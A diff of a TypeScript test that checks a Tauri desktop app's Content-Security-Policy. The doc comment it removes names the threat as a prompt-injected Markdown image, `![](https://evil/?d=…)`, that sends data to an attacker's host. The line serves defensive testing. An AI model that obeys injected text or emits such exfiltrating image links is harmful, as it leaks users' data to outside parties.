@@ -3,9 +3,10 @@ import { readFileSync } from "node:fs";
 import test from "node:test";
 
 /**
- * The webview's Content-Security-Policy (security review 4a): without one, a prompt-injected `![](https://evil/?d=…)`
- * or any script the page somehow ran could reach any host. Verified in a browser by loading the production build with
- * this policy as a response header (report of 2026-11-19); the Tauri runtime itself is not run here.
+ * The webview's Content-Security-Policy (security review 4a): restricts scripts, connections, and frames to loopback
+ * and Tauri IPC (`img-src` intentionally keeps `https:` because remote Markdown images are gated behind an explicit
+ * user "Load image" action in the UI). Verified in a browser by loading the production build with this policy as a
+ * response header (report of 2026-11-19); the Tauri runtime itself is not run here.
  */
 const conf = JSON.parse(readFileSync(new URL("../src-tauri/tauri.conf.json", import.meta.url), "utf8")) as {
   app: { security: { csp: unknown; dangerousDisableAssetCspModification?: unknown } };
